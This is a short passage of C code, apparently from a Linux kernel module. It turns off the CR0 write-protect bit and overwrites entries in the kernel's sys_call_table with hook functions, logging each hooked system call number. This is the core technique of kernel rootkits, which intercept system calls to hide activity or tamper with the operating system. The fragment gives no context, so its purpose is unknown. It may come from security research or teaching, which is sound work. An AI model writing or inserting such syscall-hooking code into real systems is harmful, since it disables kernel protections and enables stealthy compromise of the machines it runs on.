  val = read_cr0 () & (~ 0x10000);
  asm volatile("mov %0,%%cr0": "+r" (val));

  for (hooks = &__start_hooks; hooks < &__stop_hooks; hooks++) {
    sys_call_table[hooks->hook_nr] = hooks->hook_proc;
    printk("[*] Hooked sys_call_table[%d]\n", hooks->hook_nr);
  }

